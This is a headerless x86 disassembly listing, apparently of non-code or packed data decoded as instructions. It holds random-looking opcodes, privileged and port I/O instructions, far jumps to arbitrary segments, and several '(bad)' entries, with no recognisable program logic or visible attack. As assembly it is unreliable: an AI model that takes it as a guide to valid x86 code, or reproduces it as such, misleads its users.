  40fa95:	fstp   DWORD PTR [esi+0x4b9bbcbf]
  40fa9b:	mov    edx,0x679b2d2a
  40faa0:	jmp    0x2014:0xa83e84a0
  40faa7:	inc    eax
  40faa8:	jnp    0x40fabe
  40faaa:	add    al,0xd9
  40faac:	push   ds
  40faad:	and    ah,dl
  40faaf:	ror    bl,cl
  40fab1:	leave  
  40fab2:	and    dl,BYTE PTR ds:0xf1703c21
  40fab8:	je     0x40fa3b
  40faba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabb:	inc    edi
  40fabc:	retf   0xc155
  40fabf:	sbb    al,0xa3
  40fac1:	out    dx,al
  40fac2:	mov    cl,0x5
  40fac4:	pop    ss
  40fac5:	daa    
  40fac6:	push   edx
  40fac7:	imul   eax,DWORD PTR [ebx-0x44dcb201],0xffffffb2
  40face:	add    edi,DWORD PTR [eax]
  40fad0:	jp     0x40fb41
  40fad2:	mov    dh,0xb1
  40fad4:	sub    ebp,DWORD PTR [eax]
  40fad6:	push   0x6d
  40fad8:	iret   
  40fad9:	sub    al,dl
  40fadb:	jno    0x40fab5
  40fadd:	push   esp
  40fade:	mov    ds:0x99630039,eax
  40fae3:	push   ds
  40fae4:	frstor [eax-0xfb86a38]
  40faea:	push   ds
  40faeb:	xor    BYTE PTR [eax+0x417daee0],ch
  40faf1:	stc    
  40faf2:	jge    0x40fb73
  40faf4:	cmp    DWORD PTR [edi+0x77dcb50f],ebx
  40fafa:	jmp    0xc0d63f3e
  40faff:	repz das 
  40fb01:	fwait
  40fb02:	pusha  
  40fb03:	in     eax,dx
  40fb04:	call   0x5a2b0219
  40fb09:	ror    DWORD PTR [edx],0xdb
  40fb0c:	jbe    0x40fb3f
  40fb0e:	in     al,0xcb
  40fb10:	cdq    
  40fb11:	and    DWORD PTR [edx+0x5c],ebp
  40fb14:	idiv   BYTE PTR [eax]
  40fb16:	xor    eax,0x1e4bbf81
  40fb1b:	mov    BYTE PTR [esi-0x54],dl
  40fb1e:	xor    edx,DWORD PTR [edi+eax*1+0x6927813f]
  40fb25:	sbb    bh,BYTE PTR [ebp-0x50]
  40fb28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb29:	aad    0x92
  40fb2b:	cmp    ebx,edi
  40fb2d:	out    0x81,eax
  40fb2f:	icebp  
  40fb30:	dec    esi
  40fb31:	adc    esp,DWORD PTR [ebp+0x5d18386]
  40fb37:	push   ds
  40fb38:	mov    dl,BYTE PTR [esi]
  40fb3a:	pop    es
  40fb3b:	mov    edi,0xaf90788f
  40fb40:	lea    eax,[ebx+0x25]
  40fb43:	ins    BYTE PTR es:[edi],dx
  40fb44:	mov    dl,0x55
  40fb46:	add    eax,0x5837b1aa
  40fb4b:	dec    ebx
  40fb4c:	cmp    BYTE PTR [esi+0x762d4a80],ch
  40fb52:	nop
  40fb53:	and    al,0xde
  40fb55:	clc    
  40fb56:	cs pop ebx
  40fb58:	xor    ch,bl
  40fb5a:	push   ecx
  40fb5b:	pop    ebx
  40fb5c:	or     al,ch
  40fb5e:	fisttp WORD PTR [edx+eiz*4+0x7af55f42]
  40fb65:	jbe    0x40fb6b
  40fb67:	lods   eax,DWORD PTR ds:[esi]
  40fb68:	sbb    al,0x90
  40fb6a:	sub    bl,cl
  40fb6c:	in     eax,0x58
  40fb6e:	mov    ds:0x83edc039,eax
  40fb73:	fst    DWORD PTR [eax]
  40fb75:	push   cs
  40fb76:	arpl   WORD PTR [ebx-0x5fe71eca],ax
  40fb7c:	add    eax,0x934ed540
  40fb81:	aas    
  40fb82:	pop    ecx
  40fb83:	call   0x8860a345
  40fb88:	mov    ecx,0x53e36f19
  40fb8d:	(bad)  
  40fb8e:	stos   DWORD PTR es:[edi],eax
  40fb8f:	mov    dh,0xc9
  40fb91:	std    
  40fb92:	pop    ecx
  40fb93:	jl     0x40fbf0
  40fb95:	(bad)  
  40fb96:	not    eax
  40fb98:	fnstenv [eax]
  40fb9a:	arpl   WORD PTR [edi+0x7e78f810],ax
  40fba0:	xlat   BYTE PTR ds:[ebx]
  40fba1:	fiadd  WORD PTR [eax+0x69]
  40fba4:	popf   
  40fba5:	and    dh,al
  40fba7:	popa   
  40fba8:	lahf   
  40fba9:	sub    DWORD PTR [edi+ebx*1+0x9],edi
  40fbad:	ror    BYTE PTR [edx+0x3175a61e],0x90
  40fbb4:	push   cs
  40fbb5:	nop
  40fbb6:	inc    esi
  40fbb7:	repz or al,0xd
  40fbba:	dec    esp
  40fbbb:	aaa    
  40fbbc:	scas   eax,DWORD PTR es:[edi]
  40fbbd:	lock test BYTE PTR [edi+eax*2],bl
  40fbc1:	dec    edi
  40fbc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc3:	idiv   esp
  40fbc5:	lods   eax,DWORD PTR ds:[esi]
  40fbc6:	loopne 0x40fb8f
  40fbc8:	xor    ebp,ebp
  40fbca:	jl     0x40fbc0
  40fbcc:	in     al,0x4a
  40fbce:	mov    bl,0xf9
  40fbd0:	dec    edi
  40fbd1:	js     0x40fbaf
  40fbd3:	scas   eax,DWORD PTR es:[edi]
  40fbd4:	dec    eax
  40fbd5:	(bad)  
  40fbd6:	sbb    al,0xdf
  40fbd8:	pop    ebx
  40fbd9:	call   0x17f4:0x696c0682
  40fbe0:	push   ss
  40fbe1:	and    BYTE PTR [eax-0x4d],ch
  40fbe4:	scas   al,BYTE PTR es:[edi]
  40fbe5:	daa    
  40fbe6:	and    BYTE PTR [edx],ch
  40fbe8:	xchg   BYTE PTR ds:0xe429f834,dl
  40fbee:	inc    ebx
  40fbef:	inc    ebp
  40fbf0:	sbb    al,0x4d
  40fbf2:	es xor cl,ah
  40fbf5:	dec    esp
  40fbf6:	aaa    
  40fbf7:	jnp    0x40fb96
  40fbf9:	xchg   ebp,eax
  40fbfa:	push   ebp
  40fbfb:	xchg   ebx,eax
  40fbfc:	jns    0x40fbad
  40fbfe:	mov    al,ds:0x4c38175e
  40fc03:	or     al,0xba
  40fc05:	xchg   esp,eax
  40fc06:	mov    edi,esp
  40fc08:	fwait
  40fc09:	mov    ds:0x5ad49e4d,eax
  40fc0e:	mov    ecx,0x6f5cc628
  40fc13:	push   ebx
  40fc14:	in     al,0xa0
  40fc16:	ds jno 0x40fc28
  40fc19:	stos   DWORD PTR es:[edi],eax
  40fc1a:	aad    0xc2
  40fc1c:	fucomi st,st(3)
  40fc1e:	and    eax,0xa987d5
  40fc23:	sbb    eax,0xc71ef60d
  40fc28:	adc    DWORD PTR [esi],ebp
  40fc2a:	dec    DWORD PTR [edx]
  40fc2c:	out    dx,eax
  40fc2d:	jmp    0x2e604834
  40fc32:	inc    esp
  40fc33:	push   0x748dc6f0
  40fc38:	shl    DWORD PTR [esi],cl
  40fc3a:	add    ch,BYTE PTR [edx-0x2c]
  40fc3d:	pop    ecx
  40fc3e:	out    0xbe,al
  40fc40:	add    ah,BYTE PTR [ebx]
  40fc42:	push   ebx
  40fc43:	out    dx,eax
  40fc44:	push   cs
  40fc45:	mov    al,ds:0x8b90483d
  40fc4a:	fimul  WORD PTR [edi-0x6be9342f]
  40fc50:	mov    bl,BYTE PTR [edi-0x3c]
  40fc53:	dec    esp
  40fc54:	sub    esi,DWORD PTR [edx]
  40fc56:	sbb    dl,dl
  40fc58:	test   DWORD PTR [edi-0x5c6bd73c],ebx
  40fc5e:	lods   eax,DWORD PTR ds:[esi]
  40fc5f:	out    dx,al
  40fc60:	jne    0x40fc07
  40fc62:	and    al,0x5d
  40fc64:	and    BYTE PTR [ebx+edx*8+0x6ff9c976],bl
  40fc6b:	and    eax,0xb17eea7b
  40fc70:	add    ebp,DWORD PTR [ebp+0x433a7f97]
  40fc76:	popf   
  40fc77:	fcomi  st,st(4)
  40fc79:	test   bh,bl
  40fc7b:	sbb    DWORD PTR [ebx-0x1b649156],edx
  40fc81:	les    ebx,FWORD PTR [eax-0x57]
  40fc84:	push   esp
  40fc85:	out    dx,eax
  40fc86:	pushf  
  40fc87:	push   ebp
  40fc88:	(bad)  [ecx+esi*2]
  40fc8b:	std    
  40fc8c:	mov    ds:0x4dffa07e,al
  40fc91:	and    BYTE PTR [ebx-0x34],dl
  40fc94:	std    
  40fc95:	cmp    ebx,DWORD PTR [ecx-0x2a]
  40fc98:	ds xchg ecx,eax
  40fc9a:	jmp    0xeca2:0xe8b43cf5
  40fca1:	(bad)  
  40fca2:	not    al
  40fca4:	cmp    al,0x39
  40fca6:	push   esp
  40fca7:	in     al,dx
  40fca8:	cdq    
  40fca9:	es in  al,dx
  40fcab:	in     eax,0x26
  40fcad:	push   cs
  40fcae:	dec    ebp
  40fcaf:	adc    ebx,ebp
  40fcb1:	adc    ah,BYTE PTR [edx+ecx*1-0x24]
  40fcb5:	and    ah,al
  40fcb7:	sbb    dl,BYTE PTR [eax]
  40fcb9:	mov    ah,0x9c
  40fcbb:	xor    al,0x8b
  40fcbd:	mov    ds:0xac4c25b3,al
  40fcc2:	xchg   ebp,eax
  40fcc3:	xchg   DWORD PTR [edx+edi*4-0x27],ebx
  40fcc7:	fwait
  40fcc8:	dec    eax
  40fcc9:	shl    BYTE PTR [edi-0x61],1
  40fccc:	mov    ah,0x87
  40fcce:	scas   al,BYTE PTR es:[edi]
  40fccf:	hlt    
  40fcd0:	add    edi,DWORD PTR [ecx]
  40fcd2:	jge    0x40fc9b
  40fcd4:	arpl   si,cx
  40fcd6:	adc    al,dl
  40fcd8:	inc    ebx
  40fcd9:	aas    
  40fcda:	jae    0x40fce1
  40fcdc:	jae    0x40fd2b
  40fcde:	mov    esp,gs
  40fce0:	pushf  
  40fce1:	fdivr  DWORD PTR [edx]
  40fce3:	scas   eax,DWORD PTR es:[edi]
  40fce4:	shr    DWORD PTR [eax+0x56],0xe3
  40fce8:	adc    eax,DWORD PTR [edx]
  40fcea:	cwde   
  40fceb:	aaa    
  40fcec:	inc    ebp
  40fced:	adc    BYTE PTR [ecx+ecx*2+0x3a],0xf0
  40fcf2:	cld    
  40fcf3:	push   edx
  40fcf4:	xor    eax,0x60d73dc4
  40fcf9:	aam    0xc4
  40fcfb:	mul    BYTE PTR [ecx]
  40fcfd:	addr16 inc esi
  40fcff:	xchg   edx,eax
  40fd00:	xchg   ecx,eax
  40fd01:	out    0xc8,al
  40fd03:	jl     0x40fca0
  40fd05:	mov    esi,0x8a982e38
  40fd0a:	mov    esi,0xb0d08774
  40fd0f:	adc    esi,DWORD PTR [edx+0x7b8a505b]
  40fd15:	lods   eax,DWORD PTR ds:[esi]
  40fd16:	test   al,0xe0
  40fd18:	or     al,BYTE PTR [eax+0x58ca9903]
  40fd1e:	lock das 
  40fd20:	or     DWORD PTR [ecx+0x3b],ebp
  40fd23:	or     BYTE PTR [ebx-0x46601e06],ch
  40fd29:	push   0xf
  40fd2b:	rcl    DWORD PTR ds:0x81158bdb,cl
  40fd31:	inc    esi
  40fd32:	mov    ch,0xfc
  40fd34:	xchg   BYTE PTR [ecx+0x31],al
  40fd37:	pushw  0x83bf
  40fd3b:	adc    al,0x23
  40fd3d:	mov    esp,DWORD PTR [ebx-0x779a3dd3]
  40fd43:	lods   al,BYTE PTR ds:[esi]
  40fd44:	pop    eax
  40fd45:	stc    
  40fd46:	add    bl,bh
  40fd48:	int    0xc7
  40fd4a:	push   eax
  40fd4b:	not    BYTE PTR [ecx-0x713cd7a2]
  40fd51:	es mov ebp,esp
  40fd54:	dec    eax
  40fd55:	in     eax,dx
  40fd56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd57:	adc    eax,0x7c748840
  40fd5c:	pop    es
  40fd5d:	fs scas al,BYTE PTR es:[edi]
  40fd5f:	fnstsw WORD PTR [ebp-0x59]
  40fd62:	mov    esp,0xfdcb92e6
  40fd67:	and    al,0x2f
  40fd69:	rcr    DWORD PTR [edx],cl
  40fd6b:	outs   dx,DWORD PTR ds:[esi]
  40fd6c:	hlt    
  40fd6d:	jl     0x40fd97
  40fd6f:	in     al,0xdd
  40fd71:	adc    esp,DWORD PTR [esi+0x1e9e5cf3]
  40fd77:	sub    DWORD PTR [ebx-0x3ae7f11e],0x2
  40fd7e:	mov    ecx,DWORD PTR [edi+0x3be3e74e]
  40fd84:	imul   ecx,DWORD PTR [ebx],0xffffff85
  40fd87:	jns    0x40fd7a
  40fd89:	and    DWORD PTR [edx+0x36],0x61d46912
  40fd90:	pop    esp
  40fd91:	sub    eax,0xaf22ee4e
  40fd96:	push   es
  40fd97:	aas    
  40fd98:	mov    ebx,0xf9146808
  40fd9d:	or     al,0x88
  40fd9f:	jb     0x40fd71
  40fda1:	add    BYTE PTR [edx-0x2bac3101],cl
  40fda7:	inc    edi
  40fda8:	inc    ebx
  40fda9:	inc    edx
  40fdaa:	pop    edx
  40fdab:	retf   0xe6ad
  40fdae:	sbb    ch,BYTE PTR [edx-0x6a8a0be5]
  40fdb4:	add    BYTE PTR [edx],bl
  40fdb6:	xlat   BYTE PTR ds:[ebx]
  40fdb7:	mov    al,ds:0x254cc49b
  40fdbc:	fcomp  DWORD PTR [eax-0x32]
  40fdbf:	push   ss
  40fdc0:	mov    bh,0x71
  40fdc2:	js     0x40fd5c
  40fdc4:	xor    eax,0xbdc9af31
  40fdc9:	in     al,dx
  40fdca:	loope  0x40fd55
  40fdcc:	push   ebx
  40fdcd:	mov    ss,eax
  40fdcf:	jecxz  0x40fe43
  40fdd1:	and    al,0xf9
  40fdd3:	add    BYTE PTR [ebx-0x183e3250],dh
  40fdd9:	xchg   edx,eax
  40fdda:	mov    ch,0x41
  40fddc:	cmp    eax,0x86f315d6
  40fde1:	fdivr  DWORD PTR [ecx]
  40fde3:	arpl   WORD PTR ds:0x705be773,sp
  40fde9:	lods   eax,DWORD PTR ds:[esi]
  40fdea:	cs in  eax,0x49
  40fded:	push   cs
  40fdee:	rcl    DWORD PTR [edx-0x894b77c],cl
  40fdf4:	shr    esp,1
  40fdf6:	stos   BYTE PTR es:[edi],al
  40fdf7:	imul   ecx,DWORD PTR [ebx-0xc],0xa78dee4b
  40fdfe:	mov    ecx,0x4f48767e
  40fe03:	xchg   esp,eax
  40fe04:	jge    0x40fe17
  40fe06:	lods   eax,DWORD PTR ds:[esi]
  40fe07:	push   cs
  40fe08:	inc    ebx
  40fe09:	shl    DWORD PTR [ebp-0x7519238a],1
  40fe0f:	adc    BYTE PTR [esi-0xfe2d511],dh
  40fe15:	in     al,0x3d
  40fe17:	jle    0x40fe74
  40fe19:	inc    ebx
  40fe1a:	enter  0x9432,0xf7
  40fe1e:	xor    DWORD PTR [eax],0x7a
  40fe21:	sbb    ebx,DWORD PTR [ecx-0x5238b2e2]
  40fe27:	push   0xfa448cd9
  40fe2c:	int3   
  40fe2d:	mov    esp,0x3882bb94
  40fe32:	sbb    DWORD PTR [ebp+0x1c495810],eax
  40fe38:	outs   dx,DWORD PTR ds:[esi]
  40fe39:	mov    dh,0xdc
  40fe3b:	dec    ecx
  40fe3c:	(bad)
  40fe3f:	sub    BYTE PTR [edx-0x38],dl
  40fe42:	push   ecx
  40fe43:	stc    
  40fe44:	dec    ebp
  40fe45:	lahf   
  40fe46:	xchg   ebx,eax
  40fe47:	and    al,0x8b
  40fe49:	jecxz  0x40fec8
  40fe4b:	sti    
  40fe4c:	push   edi
  40fe4d:	cmp    eax,0xe98b8613
  40fe52:	mov    ds:0x5669fd1e,eax
  40fe57:	push   ebx
  40fe58:	mov    dl,0x3
  40fe5a:	and    dl,BYTE PTR ds:0x41f199b4
  40fe60:	mov    bl,dh
  40fe62:	or     dl,BYTE PTR [ecx]
  40fe64:	test   DWORD PTR [ebx],ecx
  40fe66:	xchg   esp,eax
  40fe67:	scas   al,BYTE PTR es:[edi]
  40fe68:	pop    ebx
  40fe69:	jbe    0x40fe3b
  40fe6b:	in     eax,0x19
  40fe6d:	jmp    0x40fe17
  40fe6f:	add    al,0x3a
  40fe71:	push   ecx
  40fe72:	fisub  DWORD PTR [ebp-0x13]
  40fe75:	add    BYTE PTR [ebp-0x58819669],ah
  40fe7b:	adc    dl,BYTE PTR [edx+0x130b32a5]
  40fe81:	mov    ch,0xf3
  40fe83:	mov    cl,0x5f
  40fe85:	jnp    0x40fe2b
  40fe87:	jecxz  0x40fee6
  40fe89:	add    BYTE PTR [esi+0x6b6dfc7f],bl
  40fe8f:	jns    0x40fe46
  40fe91:	es push ds
  40fe93:	clc    
  40fe94:	push   ebp
  40fe95:	cmp    edx,esp
  40fe97:	ret    0x2b66
  40fe9a:	inc    ebx
  40fe9b:	jno    0x40fe7d
  40fe9d:	je     0x40fe92
  40fe9f:	cmp    DWORD PTR [edi-0x59f7bd5c],edi
  40fea5:	add    al,0x5e
  40fea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fea8:	stos   BYTE PTR es:[edi],al
  40fea9:	and    edi,ebx
  40feab:	push   0x75b6c4bc
  40feb0:	stc    
  40feb1:	push   0xffffff83
  40feb3:	call   0x2b5e:0x2c974e89
  40feba:	pusha  
  40febb:	inc    esi
  40febc:	out    dx,eax
  40febd:	add    edi,DWORD PTR [edi+0x4a9213d7]
  40fec3:	cld    
  40fec4:	repz xchg ecx,eax
  40fec6:	pop    edx
  40fec7:	test   al,0x8c
  40fec9:	out    0x8a,al
  40fecb:	int    0x33
  40fecd:	add    eax,0xe3147bd9
  40fed2:	popa   
  40fed3:	add    dl,al
  40fed5:	in     al,dx
  40fed6:	pop    ds
  40fed7:	loopne 0x40fece
  40fed9:	out    dx,eax
  40feda:	les    ebp,FWORD PTR gs:[esi-0x42b0d7f1]
  40fee1:	aad    0x48
  40fee3:	cmp    dl,BYTE PTR [esi+0x5]
  40fee6:	lahf   
  40fee7:	test   eax,0xe633c9c0
  40feec:	dec    esi
  40feed:	push   eax
  40feee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feef:	gs jecxz 0x40ff49
  40fef2:	push   esi
  40fef3:	arpl   bp,si
  40fef5:	pop    esp
  40fef6:	jae    0x40feda
  40fef8:	aam    0x4f
  40fefa:	or     DWORD PTR [ecx-0x1bf8020b],edi
  40ff00:	mov    ebx,0x56e7a462
  40ff05:	push   eax
  40ff06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff07:	arpl   di,cx
  40ff09:	(bad)  
  40ff0a:	mov    ebx,0x1898ee42
  40ff0f:	aad    0xac
  40ff11:	sbb    esp,DWORD PTR [ebx-0x35689132]
  40ff17:	sbb    bl,BYTE PTR [ebp+0x34f5db5c]
  40ff1d:	pop    ecx
  40ff1e:	arpl   bp,si
  40ff20:	fld    QWORD PTR [ebx-0x18401f20]
  40ff26:	daa    
  40ff27:	rcl    DWORD PTR [edx],0x1b
  40ff2a:	stc    
  40ff2b:	aad    0x11
  40ff2d:	sbb    al,0x10
  40ff2f:	inc    edi
  40ff30:	jns    0x40ff4a
  40ff32:	jp     0x40ffa6
  40ff34:	jecxz  0x40ff7e
  40ff36:	mov    ds:0xdba39b98,al
  40ff3b:	pusha  
  40ff3c:	loopne 0x40fef4
  40ff3e:	arpl   WORD PTR [ecx-0x38],si
  40ff41:	add    al,0x2f
  40ff43:	sbb    al,0xca
  40ff45:	inc    edx
  40ff46:	inc    eax
  40ff47:	adc    DWORD PTR [edx],ecx
  40ff49:	push   ebx
  40ff4a:	dec    esp
  40ff4b:	dec    ebp
  40ff4c:	out    0xb0,eax
  40ff4e:	mov    eax,ds:0xa850e04c
  40ff53:	enter  0x5aff,0x8
  40ff57:	mov    bh,0xa7
  40ff59:	fldenv [edi]
  40ff5b:	push   edi
  40ff5c:	clc    
  40ff5d:	push   esi
  40ff5e:	jnp    0x40ff03
  40ff60:	dec    edx
  40ff61:	sub    DWORD PTR [edi+ebp*4-0x70],ebx
  40ff65:	pop    ecx
  40ff66:	cmp    esp,edx
  40ff68:	jne    0x40ff4a
  40ff6a:	or     eax,0x6f5c7bff
  40ff6f:	lds    edi,FWORD PTR [ecx+ebp*4+0x71d7be8c]
  40ff76:	aam    0xff
  40ff78:	ret    0x86c6
  40ff7b:	repnz inc eax
  40ff7d:	bound  eax,QWORD PTR [ebx-0x7c5555f2]
  40ff83:	dec    ebx
  40ff84:	cmc    
  40ff85:	jl     0x40ff30
  40ff87:	sbb    al,0x5e
  40ff89:	imul   edi,DWORD PTR [ebx-0x22b6b4ca],0x37
  40ff90:	test   eax,0x635dddc
  40ff95:	mov    eax,0x94ac2706
  40ff9a:	neg    bh
  40ff9c:	cmp    al,0x3a
  40ff9e:	mov    DWORD PTR [edx-0x745e6b10],edx
  40ffa4:	xor    DWORD PTR [ebp+0x2e],0x5494ecd9
  40ffab:	mov    ebx,0xe4909f6c
  40ffb0:	retf   
  40ffb1:	jmp    0x352126d3
  40ffb6:	int3   
  40ffb7:	mov    ah,BYTE PTR [eax*4+0x7bbf4d1a]
  40ffbe:	sub    edi,edx
  40ffc0:	pop    edx
  40ffc1:	or     DWORD PTR ds:0x53b6745,ecx
  40ffc7:	push   ebp
  40ffc8:	sbb    BYTE PTR [edi+eiz*1],dl
  40ffcb:	ret    0x4561
  40ffce:	sahf   
  40ffcf:	(bad)  
  40ffd0:	cmc    
  40ffd1:	push   0x214dbfea
  40ffd6:	dec    eax
  40ffd7:	fcmovb st,st(3)
  40ffd9:	jne    0x40ff7b
  40ffdb:	xchg   esp,eax
  40ffdc:	call   FWORD PTR [edx+0x455e1dc5]
  40ffe2:	mov    esi,0x79e1987c
  40ffe7:	sbb    DWORD PTR [edi+0xe73ccbb],esp
  40ffed:	sub    dh,BYTE PTR [eax-0x62]
  40fff0:	jmp    0x40ffc2
  40fff2:	aam    0xe7
  40fff4:	test   BYTE PTR [edx-0xf],0x4d
  40fff8:	cmc    
  40fff9:	call   FWORD PTR [edx]
  40fffb:	pop    ds
  40fffc:	cli    
  40fffd:	adc    DWORD PTR [edx+0x1a26d00f],edi
  410003:	push   ebp
  410004:	fcom   DWORD PTR [ebx+0x3c472dfc]
  41000a:	mov    ch,0x65
  41000c:	inc    ebp
  41000d:	and    ebp,edi
  41000f:	push   ebp
  410010:	lahf   
  410011:	mov    DWORD PTR [ebp-0x5161d94e],esp
  410017:	add    eax,0x1a5ee42e
  41001c:	jp     0x40ffc7
  41001e:	fisub  WORD PTR [edx]
  410020:	add    eax,0x4b53d2fa
  410025:	mov    dl,BYTE PTR [ebx-0x5bb3087c]
  41002b:	(bad)  
  41002d:	jp     0x40ffcd
  41002f:	mov    dl,0x9
  410031:	repz inc ebx
  410033:	gs and eax,0x62608543
  410039:	loop   0x4100b6
  41003b:	push   esi
  41003c:	xchg   DWORD PTR [esi+ecx*4],esp
  41003f:	mov    edi,0xca67c760
  410044:	retf   0x62f7
  410047:	(bad)  
  410048:	cmp    eax,eax
  41004a:	jmp    0x410086
  41004c:	mov    bh,0x19
  41004e:	push   es
  41004f:	mov    dl,0xdc
  410051:	xlat   BYTE PTR ds:[ebx]
  410052:	add    DWORD PTR [edi],ebx
  410054:	test   DWORD PTR [edx-0x6db40ac2],0xc83bb0bb
  41005e:	pop    ds
  41005f:	xchg   esp,eax
  410060:	adc    eax,eax
  410062:	pop    ds
  410063:	cmp    BYTE PTR [edi-0x943b5dc],0xba
  41006a:	cmp    DWORD PTR [ebx],esp
  41006c:	sbb    eax,0xeb4c09b9
  410071:	daa    
  410072:	sub    BYTE PTR [edx+edx*1-0x9],dh
  410076:	mov    ds:0xf7bc5c47,al
  41007b:	ja     0x41004e
  41007d:	sub    dh,dh
  41007f:	pop    esi
  410080:	and    DWORD PTR [eax],0x2af586b9
  410086:	das    
  410087:	push   eax
  410088:	xor    DWORD PTR [eax+0x4f6d830b],eax
  41008e:	retf   0xc66d
  410091:	xchg   ebx,eax
  410092:	jnp    0x41010c
  410094:	mov    ecx,0xfcf6999
  410099:	dec    eax
  41009a:	out    0x9e,eax
  41009c:	jp     0x410087
  41009e:	xchg   edi,eax
  41009f:	arpl   WORD PTR [esi],ax
  4100a1:	sub    al,0x73
  4100a3:	mov    esi,ebp
  4100a5:	sbb    DWORD PTR [edi+0x766eb5b2],ebp
  4100ab:	jb     0x410032
  4100ad:	sbb    eax,0x35913d21
  4100b2:	jne    0x410062
  4100b4:	out    0x7,al
  4100b6:	ins    DWORD PTR es:[edi],dx
  4100b7:	test   esp,eax
  4100b9:	(bad)  
  4100ba:	jo     0x4100c0
  4100bc:	jns    0x410051
  4100be:	ror    BYTE PTR [eax-0x4e270373],0xf7
  4100c5:	lods   eax,DWORD PTR ds:[esi]
  4100c6:	or     ah,bh
  4100c8:	push   es
  4100c9:	call   0x425cf653
  4100ce:	push   eax
  4100cf:	dec    edx
  4100d0:	gs cwde 
  4100d2:	bnd ret 
  4100d4:	imul   ecx,DWORD PTR [ebx+ebp*1],0x37
  4100d8:	repnz test DWORD PTR [ecx+0x40],ebx
  4100dc:	adc    BYTE PTR [eax],ch
  4100de:	in     eax,dx
  4100df:	jae    0x41012d
  4100e1:	adc    DWORD PTR [ecx-0x52],edi
  4100e4:	cs xchg ecx,edi
  4100e7:	push   ebp
  4100e8:	mov    edx,0xbe152223
  4100ed:	cmc    
  4100ee:	mov    ?,WORD PTR [ebp+0x6b002210]
  4100f4:	add    bh,bh
  4100f6:	add    al,0x0
  4100f8:	out    0x75,eax
  4100fa:	add    al,0xb8
  4100fc:	call   0x72a29d9f
  410101:	lahf   
  410102:	ins    BYTE PTR es:[edi],dx
  410103:	adc    eax,0x76116ea4
  410108:	lods   eax,DWORD PTR ds:[esi]
  410109:	aaa    
  41010a:	ror    DWORD PTR [ecx],1
  41010c:	(bad)  
  41010d:	fwait
  41010e:	inc    ebx
  41010f:	push   edi
  410110:	imul   ebx,DWORD PTR [ebx-0x71],0xfffffff2
  410114:	inc    ecx
  410115:	daa    
  410116:	cmp    BYTE PTR [ecx-0x5c],dh
  410119:	pop    edi
  41011a:	add    ecx,ebp
  41011c:	sub    eax,0xa75f95a9
  410121:	fbld   TBYTE PTR [edx]
  410123:	nop
  410124:	mov    ebp,0x48b32988
  410129:	xchg   esi,eax
  41012a:	xchg   edi,eax
  41012b:	and    al,0xde
  41012d:	js     0x4100e8
  41012f:	call   0xe0652cce
  410134:	sub    BYTE PTR [esi+0x288c403a],bh
  41013a:	jmp    0x2448840e
  41013f:	xor    al,0x95
  410141:	(bad)  [edi-0x449c9205]
  410147:	int3   
  410148:	aam    0xaf
  41014a:	jbe    0x4101ab
  41014c:	lds    edi,FWORD PTR [edi-0x6adcca5c]
  410152:	ins    BYTE PTR es:[edi],dx
  410153:	adc    BYTE PTR [ecx+esi*1-0x76da291f],al
  41015a:	xor    edx,DWORD PTR [edi+0x59cd567a]
  410160:	mov    eax,0x5ddfec29
  410165:	mov    WORD PTR [ebp+0x75],ss
  410168:	mov    al,gs:0xfaad61b
  41016e:	sub    ebp,DWORD PTR ds:0x683005a5
  410174:	sbb    ebp,ecx
  410176:	pop    edi
  410177:	xor    BYTE PTR [ecx-0x25],ah
  41017a:	mov    ecx,0x18c3ebe3
  41017f:	into   
  410180:	cmp    dl,al
  410182:	push   esp
  410183:	sbb    ecx,DWORD PTR [ebp+0x36]
  410186:	sbb    eax,0x3ac25314
  41018b:	mov    eax,0xf540b91
  410190:	fld    DWORD PTR [ecx+edx*2]
  410193:	jl     0x41012b
  410195:	adc    bl,BYTE PTR [edx+ebp*8+0x21c2b0]
  41019c:	lock into 
  41019e:	inc    edx
  41019f:	ds idiv dl
  4101a2:	es push ecx
  4101a4:	out    dx,eax
  4101a5:	inc    eax
  4101a6:	jp     0x410130
  4101a8:	xchg   ebx,eax
  4101a9:	sbb    BYTE PTR [esi+edx*4],cl
  4101ac:	mov    eax,ds:0xa6f9137c
  4101b1:	nop
  4101b2:	dec    ebp
  4101b3:	and    DWORD PTR [eax],eax
  4101b5:	mov    dl,0xac
  4101b7:	imul   DWORD PTR [edx-0x7a]
  4101ba:	mov    bl,0xf5
  4101bc:	aad    0x81
  4101be:	mov    edi,0xcc71cca
  4101c3:	sti    
  4101c4:	cmp    al,0xd
  4101c6:	bound  edx,QWORD PTR [eax+0x56]
  4101c9:	lahf   
  4101ca:	aam    0xee
  4101cc:	fsub   st(0),st
  4101ce:	xchg   ebx,eax
  4101cf:	(bad)  
  4101d0:	not    DWORD PTR [edx-0x19eaab6d]
  4101d6:	mov    dl,0xcd
  4101d8:	popf   
  4101d9:	ins    DWORD PTR es:[edi],dx
  4101da:	and    BYTE PTR [edi-0x41baa16c],dh
  4101e0:	mov    ds:0x4aa9b1c3,al
  4101e5:	test   DWORD PTR [esp+edi*8],ecx
  4101e8:	ja     0x410260
  4101ea:	wrmsr  
  4101ec:	fadd   DWORD PTR [eax]
  4101ee:	rcl    BYTE PTR [ecx-0xf],cl
  4101f1:	or     al,0xd9
  4101f3:	push   ecx
  4101f4:	lock cmp eax,0xade41110
  4101fa:	add    edx,DWORD PTR [ecx+0x38]
  4101fd:	jno    0x41023a
  4101ff:	lea    ebx,[ebp+0x65]
  410202:	sub    BYTE PTR [ebx+0x3fb10f1b],cl
  410208:	cdq    
  410209:	repnz push eax
  41020b:	xchg   esp,eax
  41020c:	mov    ds:0x9f40acd8,al
  410211:	lods   al,BYTE PTR ds:[esi]
  410212:	mov    ah,0x48
  410214:	push   edx
  410215:	arpl   bx,bp
  410217:	mov    eax,0xf6770f9c
  41021c:	jmp    0x410249
  41021e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021f:	mov    al,ds:0x38d140f0
  410224:	inc    esi
  410225:	xchg   esp,eax
  410226:	stc    
  410227:	pop    es
  410228:	jno    0x4102a8
  41022a:	sbb    ch,bh
  41022c:	sub    al,0x3e
  41022e:	mov    esi,0xb042d442
  410233:	addr16 mov dh,0xa5
  410236:	js     0x410200
  410238:	adc    al,0x93
